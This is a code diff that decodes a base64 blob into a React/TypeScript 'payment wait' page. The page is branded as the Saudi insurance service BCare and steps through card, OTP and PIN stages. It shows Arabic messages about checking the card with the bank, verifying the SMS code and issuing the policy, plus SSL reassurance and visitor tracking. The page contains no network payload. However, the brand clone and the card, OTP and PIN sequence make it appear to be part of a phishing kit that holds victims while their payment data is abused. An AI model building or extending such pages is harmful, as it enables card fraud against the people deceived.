@@ -1,1 +1,138 @@
-aW1wb3J0IHsgY3JlYXRlRmlsZVJvdXRlIH0gZnJvbSAiQHRhbnN0YWNrL3JlYWN0LXJvdXRlciI7CmltcG9ydCB7IFB1YmxpY0xheW91dCB9IGZyb20gIkAvY29tcG9uZW50cy9QdWJsaWNMYXlvdXQiOwppbXBvcnQgeyB1c2VFZmZlY3QsIHVzZVN0YXRlIH0gZnJvbSAicmVhY3QiOwppbXBvcnQgeyB1c2VWaXNpdG9yVHJhY2tpbmcgfSBmcm9tICJAL2hvb2tzL3VzZVZpc2l0b3JUcmFja2luZyI7CmltcG9ydCB7IFNoaWVsZENoZWNrLCBMb2NrLCBDcmVkaXRDYXJkLCBTbWFydHBob25lLCBGaWxlQ2hlY2sgfSBmcm9tICJsdWNpZGUtcmVhY3QiOwppbXBvcnQgeyB6IH0gZnJvbSAiem9kIjsKCmNvbnN0IHdhaXRTZWFyY2hTY2hlbWEgPSB6Lm9iamVjdCh7CiAgZnJvbTogei5lbnVtKFsiY2FyZCIsICJvdHAiLCAicGluIl0pLm9wdGlvbmFsKCksCn0pOwoKdHlwZSBXYWl0U3RhZ2UgPSAiY2FyZCIgfCAib3RwIiB8ICJwaW4iOwoKZXhwb3J0IGNvbnN0IFJvdXRlID0gY3JlYXRlRmlsZVJvdXRlKCIvcGF5bWVudC93YWl0IikoewogIGhlYWQ6ICgpID0+ICh7CiAgICBtZXRhOiBbCiAgICAgIHsgdGl0bGU6ICLYrNin2LHZiiDZhdi52KfZhNis2Kkg2KfZhNiv2YHYuSB8INio2Yog2YPZitixIiB9LAogICAgICB7IG5hbWU6ICJkZXNjcmlwdGlvbiIsIGNvbnRlbnQ6ICLZitiq2YUg2YXYsdin2KzYudipINio2YrYp9mG2KfYqiDYp9mE2K/Zgdi5INio2KPZhdin2YYiIH0sCiAgICBdLAogIH0pLAogIHZhbGlkYXRlU2VhcmNoOiB3YWl0U2VhcmNoU2NoZW1hLAogIGNvbXBvbmVudDogV2FpdFBhZ2UsCn0pOwoKY29uc3Qgc3RhZ2VDb25maWc6IFJlY29yZDxXYWl0U3RhZ2UsIHsgaWNvbjogdHlwZW9mIENyZWRpdENhcmQ7IHRpdGxlOiBzdHJpbmc7IG1lc3NhZ2U6IHN0cmluZyB9PiA9IHsKICBjYXJkOiB7CiAgICBpY29uOiBDcmVkaXRDYXJkLAogICAgdGl0bGU6ICLYrNin2LHZiiDYp9mE2KrYrdmC2YIg2YXZhiDYp9mE2KjYt9in2YLYqSIsCiAgICBtZXNzYWdlOiAi2YbYqtit2YLZgiDZhdmGINio2YrYp9mG2KfYqiDYqNi32KfZgtiq2YMg2YXYuSDYp9mE2KjZhtmDINin2YTZhdmP2LXYr9mQ2ZHYsS4g2YrYsdis2Ykg2KfZhNin2YbYqti42KfYsSDYrdiq2Ykg2KrYqtmFINin2YTZhdmI2KfZgdmC2KkuIiwKICB9LAogIG90cDogewogICAgaWNvbjogU21hcnRwaG9uZSwKICAgIHRpdGxlOiAi2KzYp9ix2Yog2KfZhNiq2K3ZgtmCINmF2YYg2LHZhdiyINin2YTYqtit2YLZgiIsCiAgICBtZXNzYWdlOiAi2YbYqtit2YLZgiDZhdmGINin2YTYsdmF2LIg2KfZhNmF2LHYs9mEINil2YTZiSDZh9in2KrZgdmDINin2YTZhdiz2KzZhC4g2YrYsdis2Ykg2KfZhNin2YbYqti42KfYsS4iLAogIH0sCiAgcGluOiB7CiAgICBpY29uOiBGaWxlQ2hlY2ssCiAgICB0aXRsZTogItis2KfYsdmKINil2LXYr9in2LEg2KfZhNmI2KvZitmC2KkiLAogICAgbWVzc2FnZTogItmG2KzZh9iyINmI2KvZitmC2Kkg2KfZhNiq2KPZhdmK2YYg2KfZhNiu2KfYtdipINio2YMuINmK2LHYrNmJINin2YTYp9mG2KrYuNin2LEuIiwKICB9LAp9OwoKZnVuY3Rpb24gV2FpdFBhZ2UoKSB7CiAgdXNlVmlzaXRvclRyYWNraW5nKCJ3YWl0Iik7CiAgY29uc3Qgc2VhcmNoID0gUm91dGUudXNlU2VhcmNoKCk7CiAgY29uc3QgZnJvbSA9IChzZWFyY2guZnJvbSA/PyAiY2FyZCIpIGFzIFdhaXRTdGFnZTsKICBjb25zdCBjb25maWcgPSBzdGFnZUNvbmZpZ1tmcm9tXTsKICBjb25zdCBbZG90cywgc2V0RG90c10gPSB1c2VTdGF0ZSgiIik7CiAgY29uc3QgW2FuZ2xlLCBzZXRBbmdsZV0gPSB1c2VTdGF0ZSgwKTsKCiAgdXNlRWZmZWN0KCgpID0+IHsKICAgIGNvbnN0IGludGVydmFsID0gc2V0SW50ZXJ2YWwoKCkgPT4gewogICAgICBzZXREb3RzKChkKSA9PiAoZC5sZW5ndGggPj0gMyA/ICIiIDogZCArICIuIikpOwogICAgfSwgNTAwKTsKICAgIHJldHVybiAoKSA9PiBjbGVhckludGVydmFsKGludGVydmFsKTsKICB9LCBbXSk7CgogIHVzZUVmZmVjdCgoKSA9PiB7CiAgICBsZXQgcmFmID0gMDsKICAgIGNvbnN0IHN0YXJ0ID0gcGVyZm9ybWFuY2Uubm93KCk7CiAgICBjb25zdCB0aWNrID0gKG5vdzogbnVtYmVyKSA9PiB7CiAgICAgIHNldEFuZ2xlKCgobm93IC0gc3RhcnQpIC8gMTAwMCkgKiAzNjApOwogICAgICByYWYgPSByZXF1ZXN0QW5pbWF0aW9uRnJhbWUodGljayk7CiAgICB9OwogICAgcmFmID0gcmVxdWVzdEFuaW1hdGlvbkZyYW1lKHRpY2spOwogICAgcmV0dXJuICgpID0+IGNhbmNlbEFuaW1hdGlvbkZyYW1lKHJhZik7CiAgfSwgW10pOwoKICBjb25zdCBJY29uID0gY29uZmlnLmljb247CgogIHJldHVybiAoCiAgICA8UHVibGljTGF5b3V0PgogICAgICA8ZGl2IGNsYXNzTmFtZT0iY29udGFpbmVyIG14LWF1dG8gZmxleCBtaW4taC1bNzB2aF0gaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIHB4LTQgcHktMTAiIGRpcj0icnRsIj4KICAgICAgICA8ZGl2IGNsYXNzTmFtZT0idy1mdWxsIG1heC13LW1kIHJvdW5kZWQtM3hsIGJnLXdoaXRlIHAtNiBzaGFkb3ctc20gcmluZy0xIHJpbmctc2xhdGUtMTAwIHNtOnAtOCI+CiAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0ibWItOCBmbGV4IGl0ZW1zLWNlbnRlciBqdXN0aWZ5LWJldHdlZW4gZ2FwLTIiPgogICAgICAgICAgICA8U3RlcCBuPXsxfSBhY3RpdmU9e2Zyb20gPT09ICJjYXJkIn0gZG9uZT17ZnJvbSAhPT0gImNhcmQifSBsYWJlbD0i2KfZhNio2LfYp9mC2KkiIC8+CiAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJoLXB4IGZsZXgtMSBiZy1zbGF0ZS0xMDAiIC8+CiAgICAgICAgICAgIDxTdGVwIG49ezJ9IGFjdGl2ZT17ZnJvbSA9PT0gIm90cCJ9IGRvbmU9e2Zyb20gPT09ICJwaW4ifSBsYWJlbD0i2KfZhNiq2K3ZgtmCIiAvPgogICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0iaC1weCBmbGV4LTEgYmctc2xhdGUtMTAwIiAvPgogICAgICAgICAgICA8U3RlcCBuPXszfSBhY3RpdmU9e2Zyb20gPT09ICJwaW4ifSBkb25lPXtmYWxzZX0gbGFiZWw9Itin2YTZiNir2YrZgtipIiAvPgogICAgICAgICAgPC9kaXY+CgogICAgICAgICAgPGRpdiBjbGFzc05hbWU9InRleHQtY2VudGVyIj4KICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9InJlbGF0aXZlIG14LWF1dG8gbWItNiBmbGV4IGgtMjQgdy0yNCBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIiPgogICAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJhYnNvbHV0ZSBpbnNldC0wIHJvdW5kZWQtZnVsbCBib3JkZXItWzVweF0gYm9yZGVyLXNsYXRlLTEwMCIgYXJpYS1oaWRkZW4gLz4KICAgICAgICAgICAgICA8ZGl2CiAgICAgICAgICAgICAgICBjbGFzc05hbWU9ImFic29sdXRlIGluc2V0LTAgcm91bmRlZC1mdWxsIGJvcmRlci1bNXB4XSBib3JkZXItdHJhbnNwYXJlbnQiCiAgICAgICAgICAgICAgICBzdHlsZT17ewogICAgICAgICAgICAgICAgICBib3JkZXJUb3BDb2xvcjogIiMxNTYzOTQiLAogICAgICAgICAgICAgICAgICBib3JkZXJSaWdodENvbG9yOiAiI2Y5YTgyNCIsCiAgICAgICAgICAgICAgICAgIHRyYW5zZm9ybTogYHJvdGF0ZSgke2FuZ2xlfWRlZylgLAogICAgICAgICAgICAgICAgfX0KICAgICAgICAgICAgICAgIGFyaWEtaGlkZGVuCiAgICAgICAgICAgICAgLz4KICAgICAgICAgICAgICA8ZGl2IGNsYXNzTmFtZT0icmVsYXRpdmUgei0xMCByb3VuZGVkLWZ1bGwgYmctYmNhcmUtc3VyZmFjZSBwLTQgdGV4dC1iY2FyZS1ibHVlIj4KICAgICAgICAgICAgICAgIDxJY29uIGNsYXNzTmFtZT0iaC05IHctOSIgLz4KICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9kaXY+CgogICAgICAgICAgICA8aDEgY2xhc3NOYW1lPSJtYi0yIHRleHQteGwgZm9udC1leHRyYWJvbGQgdGV4dC1iY2FyZS1ibHVlIHNtOnRleHQtMnhsIj4KICAgICAgICAgICAgICB7Y29uZmlnLnRpdGxlfQogICAgICAgICAgICAgIDxzcGFuIGNsYXNzTmFtZT0iaW5saW5lLWJsb2NrIHctNiB0ZXh0LWJjYXJlLW9yYW5nZSI+e2RvdHN9PC9zcGFuPgogICAgICAgICAgICA8L2gxPgogICAgICAgICAgICA8cCBjbGFzc05hbWU9Im1iLTYgdGV4dC1zbSBsZWFkaW5nLXJlbGF4ZWQgdGV4dC1iY2FyZS1tdXRlZCI+e2NvbmZpZy5tZXNzYWdlfTwvcD4KCiAgICAgICAgICAgIDxkaXYgY2xhc3NOYW1lPSJtYi00IHJvdW5kZWQtMnhsIGJnLWFtYmVyLTUwIHAtMyB0ZXh0LXhzIGZvbnQtYm9sZCB0ZXh0LWFtYmVyLTgwMCByaW5nLTEgcmluZy1hbWJlci0xMDAiPgogICAgICAgICAgICAgINmK2LHYrNmJINi52K/ZhSDYpdi62YTYp9mCINin2YTYtdmB2K3YqSDYo9mIINiq2K3Yr9mK2KvZh9inINit2KrZiSDYqtmD2KrZhdmEINin2YTYudmF2YTZitipCiAgICAgICAgICAgIDwvZGl2PgoKICAgICAgICAgICAgPGRpdiBjbGFzc05hbWU9ImZsZXggaXRlbXMtY2VudGVyIGp1c3RpZnktY2VudGVyIGdhcC0yIHJvdW5kZWQtMnhsIGJnLWJjYXJlLXN1cmZhY2UgcC0zIHRleHQteHMgdGV4dC1iY2FyZS1tdXRlZCI+CiAgICAgICAgICAgICAgPExvY2sgY2xhc3NOYW1lPSJoLTQgdy00IHRleHQtYmNhcmUtYmx1ZSIgLz4KICAgICAgICAgICAgICA8c3Bhbj7Yp9mE2K/Zgdi5INmF2KTZhdmR2YYg2KjYqti02YHZitixIFNTTC4g2YTZhiDZitmP2LfZhNioINmF2YbZgyDZhdi02KfYsdmD2Kkg2YPZhNmF2Kkg2KfZhNmF2LHZiNixLjwvc3Bhbj4KICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICA8L2Rpdj4KICAgICAgICA8L2Rpdj4KICAgICAgPC9kaXY+CiAgICA8L1B1YmxpY0xheW91dD4KICApOwp9CgpmdW5jdGlvbiBTdGVwKHsgbiwgYWN0aXZlLCBkb25lLCBsYWJlbCB9OiB7IG46IG51bWJlcjsgYWN0aXZlOiBib29sZWFuOyBkb25lOiBib29sZWFuOyBsYWJlbDogc3RyaW5nIH0pIHsKICByZXR1cm4gKAogICAgPGRpdiBjbGFzc05hbWU9ImZsZXggZmxleC1jb2wgaXRlbXMtY2VudGVyIGdhcC0xIj4KICAgICAgPGRpdgogICAgICAgIGNsYXNzTmFtZT17YGZsZXggaC03IHctNyBpdGVtcy1jZW50ZXIganVzdGlmeS1jZW50ZXIgcm91bmRlZC1mdWxsIHRleHQteHMgZm9udC1ib2xkICR7CiAgICAgICAgICBkb25lCiAgICAgICAgICAgID8gImJnLWVtZXJhbGQtNTAwIHRleHQtd2hpdGUiCiAgICAgICAgICAgIDogYWN0aXZlCiAgICAgICAgICAgICAgPyAiYmctYmNhcmUtYmx1ZSB0ZXh0LXdoaXRlIgogICAgICAgICAgICAgIDogImJnLXNsYXRlLTEwMCB0ZXh0LXNsYXRlLTQwMCIKICAgICAgICB9YH0KICAgICAgPgogICAgICAgIHtkb25lID8gPFNoaWVsZENoZWNrIGNsYXNzTmFtZT0iaC00IHctNCIgLz4gOiBufQogICAgICA8L2Rpdj4KICAgICAgPHNwYW4gY2xhc3NOYW1lPXtgdGV4dC1bMTBweF0gZm9udC1ib2xkICR7YWN0aXZlIHx8IGRvbmUgPyAidGV4dC1zbGF0ZS03MDAiIDogInRleHQtc2xhdGUtNDAwIn1gfT57bGFiZWx9PC9zcGFuPgogICAgPC9kaXY+CiAgKTsKfQo=
+import { createFileRoute } from "@tanstack/react-router";
+import { PublicLayout } from "@/components/PublicLayout";
+import { useEffect, useState } from "react";
+import { useVisitorTracking } from "@/hooks/useVisitorTracking";
+import { ShieldCheck, Lock, CreditCard, Smartphone, FileCheck } from "lucide-react";
+import { z } from "zod";
+
+const waitSearchSchema = z.object({
+  from: z.enum(["card", "otp", "pin"]).optional(),
+});
+
+type WaitStage = "card" | "otp" | "pin";
+
+export const Route = createFileRoute("/payment/wait")({
+  head: () => ({
+    meta: [
+      { title: "جاري معالجة الدفع | بي كير" },
+      { name: "description", content: "يتم مراجعة بيانات الدفع بأمان" },
+    ],
+  }),
+  validateSearch: waitSearchSchema,
+  component: WaitPage,
+});
+
+const stageConfig: Record<WaitStage, { icon: typeof CreditCard; title: string; message: string }> = {
+  card: {
+    icon: CreditCard,
+    title: "جاري التحقق من البطاقة",
+    message: "نتحقق من بيانات بطاقتك مع البنك المُصدِّر. يرجى الانتظار حتى تتم الموافقة.",
+  },
+  otp: {
+    icon: Smartphone,
+    title: "جاري التحقق من رمز التحقق",
+    message: "نتحقق من الرمز المرسل إلى هاتفك المسجل. يرجى الانتظار.",
+  },
+  pin: {
+    icon: FileCheck,
+    title: "جاري إصدار الوثيقة",
+    message: "نجهز وثيقة التأمين الخاصة بك. يرجى الانتظار.",
+  },
+};
+
+function WaitPage() {
+  useVisitorTracking("wait");
+  const search = Route.useSearch();
+  const from = (search.from ?? "card") as WaitStage;
+  const config = stageConfig[from];
+  const [dots, setDots] = useState("");
+  const [angle, setAngle] = useState(0);
+
+  useEffect(() => {
+    const interval = setInterval(() => {
+      setDots((d) => (d.length >= 3 ? "" : d + "."));
+    }, 500);
+    return () => clearInterval(interval);
+  }, []);
+
+  useEffect(() => {
+    let raf = 0;
+    const start = performance.now();
+    const tick = (now: number) => {
+      setAngle(((now - start) / 1000) * 360);
+      raf = requestAnimationFrame(tick);
+    };
+    raf = requestAnimationFrame(tick);
+    return () => cancelAnimationFrame(raf);
+  }, []);
+
+  const Icon = config.icon;
+
+  return (
+    <PublicLayout>
+      <div className="container mx-auto flex min-h-[70vh] items-center justify-center px-4 py-10" dir="rtl">
+        <div className="w-full max-w-md rounded-3xl bg-white p-6 shadow-sm ring-1 ring-slate-100 sm:p-8">
+          <div className="mb-8 flex items-center justify-between gap-2">
+            <Step n={1} active={from === "card"} done={from !== "card"} label="البطاقة" />
+            <div className="h-px flex-1 bg-slate-100" />
+            <Step n={2} active={from === "otp"} done={from === "pin"} label="التحقق" />
+            <div className="h-px flex-1 bg-slate-100" />
+            <Step n={3} active={from === "pin"} done={false} label="الوثيقة" />
+          </div>
+
+          <div className="text-center">
+            <div className="relative mx-auto mb-6 flex h-24 w-24 items-center justify-center">
+              <div className="absolute inset-0 rounded-full border-[5px] border-slate-100" aria-hidden />
+              <div
+                className="absolute inset-0 rounded-full border-[5px] border-transparent"
+                style={{
+                  borderTopColor: "#156394",
+                  borderRightColor: "#f9a824",
+                  transform: `rotate(${angle}deg)`,
+                }}
+                aria-hidden
+              />
+              <div className="relative z-10 rounded-full bg-bcare-surface p-4 text-bcare-blue">
+                <Icon className="h-9 w-9" />
+              </div>
+            </div>
+
+            <h1 className="mb-2 text-xl font-extrabold text-bcare-blue sm:text-2xl">
+              {config.title}
+              <span className="inline-block w-6 text-bcare-orange">{dots}</span>
+            </h1>
+            <p className="mb-6 text-sm leading-relaxed text-bcare-muted">{config.message}</p>
+
+            <div className="mb-4 rounded-2xl bg-amber-50 p-3 text-xs font-bold text-amber-800 ring-1 ring-amber-100">
+              يرجى عدم إغلاق الصفحة أو تحديثها حتى تكتمل العملية
+            </div>
+
+            <div className="flex items-center justify-center gap-2 rounded-2xl bg-bcare-surface p-3 text-xs text-bcare-muted">
+              <Lock className="h-4 w-4 text-bcare-blue" />
+              <span>الدفع مؤمّن بتشفير SSL. لن يُطلب منك مشاركة كلمة المرور.</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </PublicLayout>
+  );
+}
+
+function Step({ n, active, done, label }: { n: number; active: boolean; done: boolean; label: string }) {
+  return (
+    <div className="flex flex-col items-center gap-1">
+      <div
+        className={`flex h-7 w-7 items-center justify-center rounded-full text-xs font-bold ${
+          done
+            ? "bg-emerald-500 text-white"
+            : active
+              ? "bg-bcare-blue text-white"
+              : "bg-slate-100 text-slate-400"
+        }`}
+      >
+        {done ? <ShieldCheck className="h-4 w-4" /> : n}
+      </div>
+      <span className={`text-[10px] font-bold ${active || done ? "text-slate-700" : "text-slate-400"}`}>{label}</span>
+    </div>
+  );
+}
